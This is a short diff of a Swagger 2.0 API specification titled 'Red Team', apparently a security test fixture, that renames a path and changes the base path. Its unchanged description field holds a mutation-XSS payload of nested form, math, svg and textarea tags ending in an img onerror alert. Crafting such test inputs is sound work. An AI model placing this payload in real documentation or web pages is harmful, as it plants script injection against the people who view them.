@@ -1,11 +1,11 @@
 swagger: '2.0'
 info:
-  title: Red Team 2.1
+  title: Red Team 2.2
   description: |
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
 
   version: production
-basePath: https://127.0.0.1/
+basePath: /cybervaca/sentinel/main/
 produces:
   - application/xml
   - application/json
@@ -15,13 +15,13 @@ consumes:
 security:
   - basicAuth: []
 paths:
-  /accounts:
+  /test.json:
     get:
       responses:
         '200':
           description: No response was specified
       tags:
-        - accounts
+        - accountstest
       operationId: findAccounts
       summary: Finds all accounts
   '/accounts/groupid/{id}':
